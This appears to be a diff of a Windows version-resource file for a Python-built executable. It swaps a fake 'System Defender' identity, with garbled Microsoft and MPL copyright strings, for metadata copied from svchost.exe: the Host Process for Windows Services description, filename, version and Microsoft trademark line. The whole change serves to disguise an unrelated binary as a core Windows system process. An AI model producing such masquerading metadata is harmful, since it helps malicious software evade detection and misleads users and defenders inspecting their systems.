@@ -12,8 +12,8 @@ VSVersionInfo(
   ffi=FixedFileInfo(
     # filevers and prodvers should be always a tuple with four items: (1, 2, 3, 4)
     # Set not needed items to zero 0.
-    filevers=(91, 4, 0, 7823),
-    prodvers=(91, 4, 0, 0),
+    filevers=(10, 0, 19041, 1),
+    prodvers=(10, 0, 19041, 1),
     # Contains a bitmask that specifies the valid bits 'flags'r
     mask=0x3f,
     # Contains a bitmask that specifies the Boolean attributes of the file.
@@ -38,14 +38,14 @@ VSVersionInfo(
         [StringStruct('Comments', ''),
         StringStruct('LegalCopyright', '©Windows Microsoft Corporation; available under the MPL 2 license.'),
         StringStruct('CompanyName', 'Microsoft Corporation'),
-        StringStruct('FileDescription', 'System Defender'),
-        StringStruct('FileVersion', '91.4.0'),
-        StringStruct('ProductVersion', '91.4.0'),
-        StringStruct('InternalName', 'System Defender'),
-        StringStruct('LegalTrademarks', 'System Defender is a Trademark of The Microsoft Foundation.'),
-        StringStruct('OriginalFilename', 'WindowsSystemDefender.exe'),
-        StringStruct('ProductName', 'System Defender'),
-        StringStruct('BuildID', '20210602030101')])
+        StringStruct('FileDescription', 'Host Process for Windows Services'),
+        StringStruct('FileVersion', '10.0.19041.1'),
+        StringStruct('ProductVersion', '10.0.19041.1'),
+        StringStruct('InternalName', 'svchost.exe'),
+        StringStruct('LegalTrademarks', 'Microsoft® is a registered trademark of the Microsoft Corporation.'),
+        StringStruct('OriginalFilename', 'svchost.exe'),
+        StringStruct('ProductName', 'Microsoft® Windows® Operating System'),
+        StringStruct('BuildID', '10.0.19041.1')])
       ]), 
     VarFileInfo([VarStruct('Translation', [0, 1200])])
   ]
